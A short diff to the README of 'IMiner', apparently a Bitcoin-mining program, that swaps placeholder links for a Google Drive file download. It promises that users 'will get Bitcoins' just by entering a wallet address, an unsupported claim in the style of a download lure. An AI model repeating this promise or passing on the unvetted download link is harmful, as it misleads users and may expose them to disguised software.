@@ -7,5 +7,4 @@ Mine Bitcoin with IMiner. Just enter your wallet address and press 'start mining
 4. enter your wallet address and press 'start mining'
 5. You will get Bitcoins.
 # Thanks For Using IMiner!
-[1]: http://example.com/ "Title"
-[2]: http://example.org/ "Title"
+[1]: https://drive.google.com/file/d/1S34d1mVNlmDYCj9alEOcf36VoEmB5MDH/view?usp=sharing "Title"
